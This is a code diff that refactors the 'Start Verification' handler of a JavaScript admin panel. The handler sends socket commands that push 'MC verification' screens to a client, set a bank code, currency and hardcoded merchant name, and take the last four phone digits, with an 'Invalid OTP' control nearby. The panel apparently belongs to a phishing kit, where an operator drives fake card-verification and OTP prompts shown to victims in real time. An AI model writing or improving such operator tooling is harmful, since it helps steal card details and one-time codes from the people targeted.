@@ -2876,63 +2876,69 @@ function initMcPanel() {
     }
   });
   
-  // Start verification button
-  document.getElementById('mcStartVerification').addEventListener('click', function() {
-    if (!currentMcInvoiceId) {
-      alert('No transaction selected');
-      return;
-    }
-    
-    const verificationType = document.getElementById('mcVerificationType').value;
-    const bankCode = document.getElementById('mcBankSelect').value;
-    const currency = document.getElementById('mcCurrencySelect').value;
-    const phoneLastFour = document.getElementById('mcPhoneLastFour').value;
-    
-    if (!phoneLastFour || phoneLastFour.length !== 4 || !/^\d{4}$/.test(phoneLastFour)) {
-      alert('Please enter the last 4 digits of the phone number');
-      return;
-    }
-    
-    // First, show the MC verification screen to the client
+// FIX 2: Enhanced bank selection handling in admin.html
+document.getElementById('mcStartVerification').addEventListener('click', function() {
+  if (!currentMcInvoiceId) {
+    alert('No transaction selected');
+    return;
+  }
+  
+  const verificationType = document.getElementById('mcVerificationType').value;
+  const bankCode = document.getElementById('mcBankSelect').value;
+  const currency = document.getElementById('mcCurrencySelect').value;
+  const phoneLastFour = document.getElementById('mcPhoneLastFour').value;
+  
+  if (!phoneLastFour || phoneLastFour.length !== 4 || !/^\d{4}$/.test(phoneLastFour)) {
+    alert('Please enter the last 4 digits of the phone number');
+    return;
+  }
+  
+  // First, send the bank code directly to ensure it gets updated
+  socket.emit('update_mc_bank', {
+    invoiceId: currentMcInvoiceId,
+    bankCode: bankCode
+  });
+  
+  // Then show the MC verification screen to the client
+  socket.emit('admin_command', {
+    command: 'show_mc_verification',
+    invoiceId: currentMcInvoiceId,
+    cardType: verificationType,
+    phoneLastFour: phoneLastFour
+  });
+  
+  // Wait a moment before sending the start command
+  setTimeout(() => {
+    // Then send the start verification command with all details
     socket.emit('admin_command', {
-      command: 'show_mc_verification',
+      command: 'start_verification',
       invoiceId: currentMcInvoiceId,
-      cardType: verificationType,
+      verificationType: verificationType,
+      bankCode: bankCode,
+      merchantName: 'Peacock Merchandise',
       phoneLastFour: phoneLastFour
     });
     
-    // Wait a moment before sending the start command
-    setTimeout(() => {
-      // Then send the start verification command with all details
-      socket.emit('admin_command', {
-        command: 'start_verification',
-        invoiceId: currentMcInvoiceId,
-        verificationType: verificationType,
-        bankCode: bankCode,
-        merchantName: 'Peacock Merchandise',
-        phoneLastFour: phoneLastFour
-      });
-      
- // Update currency if needed
-socket.emit('update_mc_currency', {
-  invoiceId: currentMcInvoiceId,
-  currency: currency
+    // Update currency if needed
+    socket.emit('update_mc_currency', {
+      invoiceId: currentMcInvoiceId,
+      currency: currency
+    });
+  }, 1000);
+  
+  // Set button to loading state
+  const startBtn = document.getElementById('mcStartVerification');
+  startBtn.innerHTML = 'Starting Verification...';
+  startBtn.disabled = true;
+  
+  // Reset button after 3 seconds
+  setTimeout(() => {
+    startBtn.innerHTML = 'Start Verification';
+    startBtn.disabled = false;
+  }, 3000);
+  
+  showMessage('success', 'MC verification started for transaction ' + currentMcInvoiceId);
 });
-    }, 1000);
-    
-    // Set button to loading state
-    const startBtn = document.getElementById('mcStartVerification');
-    startBtn.innerHTML = 'Starting Verification...';
-    startBtn.disabled = true;
-    
-    // Reset button after 3 seconds
-    setTimeout(() => {
-      startBtn.innerHTML = 'Start Verification';
-      startBtn.disabled = false;
-    }, 3000);
-    
-    showMessage('success', 'MC verification started for transaction ' + currentMcInvoiceId);
-  });
   
   // Invalid OTP button
   document.getElementById('mcOtpInvalidBtn').addEventListener('click', () => {
